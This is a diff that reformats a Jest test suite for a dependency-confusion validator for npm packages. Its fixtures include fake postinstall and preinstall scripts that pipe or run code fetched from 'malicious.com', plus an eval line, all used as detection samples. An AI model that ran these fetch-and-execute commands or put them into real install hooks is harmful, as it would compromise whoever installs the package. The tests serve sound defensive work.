@@ -87,8 +87,8 @@ describe('DependencyConfusionValidator', () => {
         name: 'my-package',
         version: '1.0.0',
         scripts: {
-          build: 'tsc'
-        }
+          build: 'tsc',
+        },
       });
       mockFs.readFileSync.mockReturnValue(validPackage);
 
@@ -100,7 +100,7 @@ describe('DependencyConfusionValidator', () => {
 
     it('should detect missing package name', async () => {
       const invalidPackage = JSON.stringify({
-        version: '1.0.0'
+        version: '1.0.0',
       });
       mockFs.readFileSync.mockReturnValue(invalidPackage);
 
@@ -112,7 +112,7 @@ describe('DependencyConfusionValidator', () => {
 
     it('should detect missing package version', async () => {
       const invalidPackage = JSON.stringify({
-        name: 'my-package'
+        name: 'my-package',
       });
       mockFs.readFileSync.mockReturnValue(invalidPackage);
 
@@ -127,8 +127,8 @@ describe('DependencyConfusionValidator', () => {
         name: 'my-package',
         version: '1.0.0',
         scripts: {
-          postinstall: 'curl http://malicious.com/script.sh | sh'
-        }
+          postinstall: 'curl http://malicious.com/script.sh | sh',
+        },
       });
       mockFs.readFileSync.mockReturnValue(suspiciousPackage);
 
@@ -143,8 +143,8 @@ describe('DependencyConfusionValidator', () => {
         name: 'my-package',
         version: '1.0.0',
         scripts: {
-          preinstall: 'wget http://malicious.com/malware && ./malware'
-        }
+          preinstall: 'wget http://malicious.com/malware && ./malware',
+        },
       });
       mockFs.readFileSync.mockReturnValue(suspiciousPackage);
 
@@ -159,8 +159,8 @@ describe('DependencyConfusionValidator', () => {
         name: 'my-package',
         version: '1.0.0',
         scripts: {
-          postinstall: 'eval $(echo "malicious code")'
-        }
+          postinstall: 'eval $(echo "malicious code")',
+        },
       });
       mockFs.readFileSync.mockReturnValue(suspiciousPackage);
 
@@ -201,7 +201,7 @@ describe('DependencyConfusionValidator', () => {
           isConfused: false,
           risk: 'low',
           details: 'Package resolves from expected registry',
-          recommendation: 'No action required.'
+          recommendation: 'No action required.',
         },
         {
           packageName: '@types/node',
@@ -210,8 +210,8 @@ describe('DependencyConfusionValidator', () => {
           isConfused: true,
           risk: 'critical',
           details: 'Registry mismatch detected',
-          recommendation: 'Remove immediately'
-        }
+          recommendation: 'Remove immediately',
+        },
       ];
 
       const report = DependencyConfusionValidator.generateSecurityReport(results);
@@ -231,8 +231,8 @@ describe('DependencyConfusionValidator', () => {
           isConfused: true,
           risk: 'critical',
           details: 'High risk',
-          recommendation: 'Remove immediately'
-        }
+          recommendation: 'Remove immediately',
+        },
       ];
 
       const report = DependencyConfusionValidator.generateSecurityReport(results);
@@ -249,8 +249,8 @@ describe('DependencyConfusionValidator', () => {
           isConfused: true,
           risk: 'high',
           details: 'High risk',
-          recommendation: 'Audit package'
-        }
+          recommendation: 'Audit package',
+        },
       ];
 
       const report = DependencyConfusionValidator.generateSecurityReport(results);
@@ -267,8 +267,8 @@ describe('DependencyConfusionValidator', () => {
           isConfused: true,
           risk: 'medium',
           details: 'Registry mismatch',
-          recommendation: 'Verify'
-        }
+          recommendation: 'Verify',
+        },
       ];
 
       const report = DependencyConfusionValidator.generateSecurityReport(results);
@@ -287,7 +287,7 @@ describe('DependencyConfusionValidator', () => {
           isConfused: false,
           risk: 'low',
           details: 'OK',
-          recommendation: 'None'
+          recommendation: 'None',
         },
         {
           packageName: 'pkg2',
@@ -296,8 +296,8 @@ describe('DependencyConfusionValidator', () => {
           isConfused: false,
           risk: 'low',
           details: 'OK',
-          recommendation: 'None'
-        }
+          recommendation: 'None',
+        },
       ];
 
       const report = DependencyConfusionValidator.generateSecurityReport(results);
@@ -318,12 +318,60 @@ describe('DependencyConfusionValidator', () => {
 
     it('should count all risk levels correctly', () => {
       const results: DependencyValidationResult[] = [
-        { packageName: 'p1', expectedRegistry: 'npm', actualRegistry: 'npm', isConfused: true, risk: 'critical', details: '', recommendation: '' },
-        { packageName: 'p2', expectedRegistry: 'npm', actualRegistry: 'npm', isConfused: true, risk: 'critical', details: '', recommendation: '' },
-        { packageName: 'p3', expectedRegistry: 'npm', actualRegistry: 'npm', isConfused: true, risk: 'high', details: '', recommendation: '' },
-        { packageName: 'p4', expectedRegistry: 'npm', actualRegistry: 'npm', isConfused: true, risk: 'medium', details: '', recommendation: '' },
-        { packageName: 'p5', expectedRegistry: 'npm', actualRegistry: 'npm', isConfused: true, risk: 'medium', details: '', recommendation: '' },
-        { packageName: 'p6', expectedRegistry: 'npm', actualRegistry: 'npm', isConfused: false, risk: 'low', details: '', recommendation: '' },
+        {
+          packageName: 'p1',
+          expectedRegistry: 'npm',
+          actualRegistry: 'npm',
+          isConfused: true,
+          risk: 'critical',
+          details: '',
+          recommendation: '',
+        },
+        {
+          packageName: 'p2',
+          expectedRegistry: 'npm',
+          actualRegistry: 'npm',
+          isConfused: true,
+          risk: 'critical',
+          details: '',
+          recommendation: '',
+        },
+        {
+          packageName: 'p3',
+          expectedRegistry: 'npm',
+          actualRegistry: 'npm',
+          isConfused: true,
+          risk: 'high',
+          details: '',
+          recommendation: '',
+        },
+        {
+          packageName: 'p4',
+          expectedRegistry: 'npm',
+          actualRegistry: 'npm',
+          isConfused: true,
+          risk: 'medium',
+          details: '',
+          recommendation: '',
+        },
+        {
+          packageName: 'p5',
+          expectedRegistry: 'npm',
+          actualRegistry: 'npm',
+          isConfused: true,
+          risk: 'medium',
+          details: '',
+          recommendation: '',
+        },
+        {
+          packageName: 'p6',
+          expectedRegistry: 'npm',
+          actualRegistry: 'npm',
+          isConfused: false,
+          risk: 'low',
+          details: '',
+          recommendation: '',
+        },
       ];
 
       const report = DependencyConfusionValidator.generateSecurityReport(results);
@@ -342,8 +390,8 @@ describe('DependencyConfusionValidator', () => {
         name: 'test-package',
         version: '1.0.0',
         dependencies: {
-          'lodash': '4.17.21'
-        }
+          lodash: '4.17.21',
+        },
       });
       mockFs.readFileSync.mockReturnValue(packageJson);
 
@@ -370,8 +418,8 @@ describe('DependencyConfusionValidator', () => {
         name: 'test-package',
         version: '1.0.0',
         devDependencies: {
-          'jest': '29.0.0'
-        }
+          jest: '29.0.0',
+        },
       });
       mockFs.readFileSync.mockReturnValue(packageJson);
 
@@ -398,11 +446,11 @@ describe('DependencyConfusionValidator', () => {
         name: 'test-package',
         version: '1.0.0',
         dependencies: {
-          'express': '4.18.0'
+          express: '4.18.0',
         },
         devDependencies: {
-          'typescript': '5.0.0'
-        }
+          typescript: '5.0.0',
+        },
       });
       mockFs.readFileSync.mockReturnValue(packageJson);
 
@@ -428,8 +476,8 @@ describe('DependencyConfusionValidator', () => {
         version: '1.0.0',
         dependencies: {
           '@types/node': '18.0.0',
-          '@babel/core': '7.20.0'
-        }
+          '@babel/core': '7.20.0',
+        },
       });
       mockFs.readFileSync.mockReturnValue(packageJson);
 
@@ -457,8 +505,8 @@ describe('DependencyConfusionValidator', () => {
         name: 'test-package',
         version: '1.0.0',
         dependencies: {
-          '@github/some-package': '1.0.0'
-        }
+          '@github/some-package': '1.0.0',
+        },
       });
       mockFs.readFileSync.mockReturnValue(packageJson);
 
@@ -484,9 +532,9 @@ describe('DependencyConfusionValidator', () => {
         throw new Error('File not found');
       });
 
-      await expect(
-        DependencyConfusionValidator.validateDependencies('/nonexistent/package.json')
-      ).rejects.toThrow('Failed to validate dependencies');
+      await expect(DependencyConfusionValidator.validateDependencies('/nonexistent/package.json')).rejects.toThrow(
+        'Failed to validate dependencies'
+      );
     });
 
     it('should handle registry fetch errors', async () => {
@@ -494,8 +542,8 @@ describe('DependencyConfusionValidator', () => {
         name: 'test-package',
         version: '1.0.0',
         dependencies: {
-          'some-package': '1.0.0'
-        }
+          'some-package': '1.0.0',
+        },
       });
       mockFs.readFileSync.mockReturnValue(packageJson);
 
@@ -517,8 +565,8 @@ describe('DependencyConfusionValidator', () => {
         name: 'test-package',
         version: '1.0.0',
         dependencies: {
-          'some-package': '1.0.0'
-        }
+          'some-package': '1.0.0',
+        },
       });
       mockFs.readFileSync.mockReturnValue(packageJson);
 
@@ -540,8 +588,8 @@ describe('DependencyConfusionValidator', () => {
         name: 'test-package',
         version: '1.0.0',
         dependencies: {
-          'nonexistent-package': '1.0.0'
-        }
+          'nonexistent-package': '1.0.0',
+        },
       });
       mockFs.readFileSync.mockReturnValue(packageJson);
 
@@ -570,8 +618,8 @@ describe('DependencyConfusionValidator', () => {
         name: 'my-package',
         version: '1.0.0',
         scripts: {
-          postinstall: obfuscatedScript
-        }
+          postinstall: obfuscatedScript,
+        },
       });
       mockFs.readFileSync.mockReturnValue(suspiciousPackage);
 
@@ -586,8 +634,8 @@ describe('DependencyConfusionValidator', () => {
         name: 'my-package',
         version: '1.0.0',
         scripts: {
-          build: 123 // Non-string value
-        }
+          build: 123, // Non-string value
+        },
       });
       mockFs.readFileSync.mockReturnValue(packageWithNonStringScript);
 
